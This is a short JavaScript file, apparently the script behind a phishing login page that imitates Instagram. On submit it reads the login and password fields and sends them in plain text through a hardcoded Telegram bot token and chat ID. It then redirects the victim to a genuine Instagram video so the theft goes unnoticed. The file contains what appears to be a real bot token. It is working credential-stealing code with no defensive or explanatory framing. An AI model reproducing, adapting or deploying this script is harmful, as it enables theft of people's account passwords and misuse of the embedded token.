const form = document.querySelector('form')

let bot = {
	TOKEN: "5260298302:AAHqKPUaAyIHq5Z1q-VWNBUajXzSsjFLUE4",
	chatID: "-749947677",

}


form.addEventListener("submit", (e)=>{
	e.preventDefault()
	const login = document.querySelector('.login')
	const password = document.querySelector('.password')

	fetch(` https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${"Login: " + login.value + "  Parol: " + password.value}`,{
		method: 'GET'
	})
	.then(success => {
		window.location.href="https://www.instagram.com/tv/CaZpfxxOAGH/?igshid=OTE2OGRmYjI="
	},error =>{
		alert("Message not send")
		console.log(error);
	})
	login.value = null
	password.value = null
})


function inputType (){
	let x = document.querySelector(".password")
	let y = document.querySelector("#hide-one")
	let z = document.querySelector("#hide-two")

	if(x.type === "password"){
		x.type = "text"
		y.style.display = "block"
		z.style.display = "none"
	}
	else{
		x.type = "password"
		y.style.display = "none"
		z.style.display = "block"
	}
}